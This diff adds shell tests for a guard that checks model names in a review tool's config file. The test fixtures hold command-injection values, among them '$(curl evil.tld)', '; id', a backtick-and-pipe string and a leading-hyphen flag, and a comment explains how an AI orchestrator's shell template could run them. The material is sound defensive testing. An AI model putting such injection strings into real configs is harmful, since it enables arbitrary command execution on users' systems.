@@ -469,3 +469,119 @@ EOF
   has_line "settings.min_reviewers=3"
   printf '%s\n' "$stderr" | grep -q 'min_reviewers'
 }
+
+# ---------------------------------------------------------------------------
+# modelslug guard on reviewer.<p>.model — the injection sink.
+#
+# A model value is interpolated UNQUOTED into a shell command the orchestrator
+# composes (skills/run/SKILL.md's RC_GOOGLE_MODEL=<model> template), IN THE
+# ORCHESTRATOR'S OWN SESSION, OUTSIDE ANY SANDBOX. The reader's control-chars-
+# only `valid_str` let shell metacharacters (space, ; | ` $ ( )) survive, so a
+# repo-committed config.yml could reach command position. The `modelslug` kind
+# is a charset allowlist at the reader — the only real defense, since $(...)
+# expands even inside double quotes so an LLM quoting the template can't save it.
+# ---------------------------------------------------------------------------
+
+@test "modelslug: command-substitution in a model value is rejected + noted" {
+  cat >"$CFG/config.yml" <<'EOF'
+reviewers:
+  google:
+    model: "gemini-3 $(curl evil.tld)"
+EOF
+  run --separate-stderr "$SCRIPT" "$CFG"
+  [ "$status" -eq 0 ]
+  # rejected -> falls back to google's default (empty)
+  has_line "reviewer.google.model="
+  printf '%s\n' "$stderr" | grep -q 'reviewer.google.model'
+  # the metacharacters never reach stdout
+  ! printf '%s\n' "$output" | grep -q 'curl evil'
+  ! printf '%s\n' "$output" | grep -vE '^#|='
+}
+
+@test "modelslug: semicolon/space in a model value is rejected (the live exploit)" {
+  cat >"$CFG/config.yml" <<'EOF'
+reviewers:
+  google:
+    model: "gemini-3 ; id"
+EOF
+  run --separate-stderr "$SCRIPT" "$CFG"
+  [ "$status" -eq 0 ]
+  has_line "reviewer.google.model="
+  printf '%s\n' "$stderr" | grep -q 'reviewer.google.model'
+  ! printf '%s\n' "$output" | grep -qF 'gemini-3 ; id'
+}
+
+@test "modelslug: backtick and pipe in a model value are rejected" {
+  cat >"$CFG/config.yml" <<'EOF'
+reviewers:
+  codex:
+    model: "gpt `id` | sh"
+EOF
+  run --separate-stderr "$SCRIPT" "$CFG"
+  [ "$status" -eq 0 ]
+  has_line "reviewer.codex.model="
+  printf '%s\n' "$stderr" | grep -q 'reviewer.codex.model'
+}
+
+@test "modelslug: a leading hyphen is rejected (no flag injection)" {
+  cat >"$CFG/config.yml" <<'EOF'
+reviewers:
+  google:
+    model: "-cfoo"
+EOF
+  run --separate-stderr "$SCRIPT" "$CFG"
+  [ "$status" -eq 0 ]
+  has_line "reviewer.google.model="
+  printf '%s\n' "$stderr" | grep -q 'reviewer.google.model'
+}
+
+@test "modelslug: the guard covers every reviewer, not just google" {
+  cat >"$CFG/config.yml" <<'EOF'
+reviewers:
+  claude:
+    model: "opus ; id"
+  perplexity:
+    model: "sonar ; id"
+EOF
+  run --separate-stderr "$SCRIPT" "$CFG"
+  [ "$status" -eq 0 ]
+  # claude falls back to its empty default; perplexity to its 'sonar' default
+  has_line "reviewer.claude.model="
+  has_line "reviewer.perplexity.model=sonar"
+  printf '%s\n' "$stderr" | grep -q 'reviewer.claude.model'
+  printf '%s\n' "$stderr" | grep -q 'reviewer.perplexity.model'
+}
+
+@test "modelslug: real slugs are admitted unchanged" {
+  cat >"$CFG/config.yml" <<'EOF'
+reviewers:
+  google:
+    model: gemini-2.5-pro
+  codex:
+    model: openai/gpt-4o:free
+  claude:
+    model: ~moonshotai/kimi-latest
+EOF
+  run --separate-stderr "$SCRIPT" "$CFG"
+  [ "$status" -eq 0 ]
+  has_line "reviewer.google.model=gemini-2.5-pro"
+  has_line "reviewer.codex.model=openai/gpt-4o:free"
+  has_line "reviewer.claude.model=~moonshotai/kimi-latest"
+  # a clean config emits no notes about these keys
+  ! printf '%s\n' "$stderr" | grep -q 'reviewer.google.model'
+}
+
+@test "modelslug: an explicit empty model stays valid (no spurious note, no default swap)" {
+  # Empty means "use the tool's own default" — must remain valid, exactly as the
+  # old `str` kind treated it. Regressing this would flip perplexity's explicit
+  # empty into its 'sonar' default.
+  cat >"$CFG/config.yml" <<'EOF'
+reviewers:
+  perplexity:
+    model: ""
+EOF
+  run --separate-stderr "$SCRIPT" "$CFG"
+  [ "$status" -eq 0 ]
+  has_line "reviewer.perplexity.model="
+  ! printf '%s\n' "$stderr" | grep -q 'reviewer.perplexity.model'
+}
